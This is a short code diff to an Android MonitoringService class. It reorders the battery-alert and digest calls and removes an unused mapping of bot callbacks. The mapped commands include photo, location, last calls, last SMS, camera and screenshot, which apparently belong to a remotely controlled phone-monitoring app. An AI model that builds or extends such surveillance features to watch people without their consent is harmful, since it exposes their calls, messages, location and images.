@@ -561,10 +561,10 @@ class MonitoringService : Service() {
                 try {
                     monitorBeatAt = android.os.SystemClock.elapsedRealtime()
                     monitorCycleMs = if (!cachedMonitoringPaused) syncIntervalMillis() else 15 * 60_000L
+                    try { checkBatteryAlert() } catch (_: Exception) { }
+                    try { maybeSendDigest() } catch (_: Exception) { }
                     if (!cachedMonitoringPaused) {
                         if (checkAndSendNewData()) idleDataCycles = 0 else idleDataCycles = (idleDataCycles + 1).coerceAtMost(100)
-                        try { checkBatteryAlert() } catch (_: Exception) { }
-                        try { maybeSendDigest() } catch (_: Exception) { }
                         try {
                             CrashReporter.flushPending(this@MonitoringService)
                         } catch (_: Exception) {
@@ -1083,21 +1083,6 @@ class MonitoringService : Service() {
             try {
                 val callback = update.callbackQuery
                 if (callback != null) {
-                    when (callback.data) {
-                        "photo" -> "/photo"
-                        "location" -> "/location"
-                        "lastcalls" -> "/lastcalls"
-                        "lastsms" -> "/lastsms"
-                        "battery" -> "/battery"
-                        "status" -> "/status"
-                        "stop" -> "/stop"
-                        "resume" -> "/resume"
-                        "camfront" -> "/camera"
-                        "camback" -> "/camera"
-                        "pause60" -> "/pause"
-                        "shot" -> "/screenshot"
-                        else -> null
-                    }
                     handleCallbackQuery(callback)
                 } else {
                     val message = update.message ?: update.editedMessage ?: update.channelPost ?: update.editedChannelPost
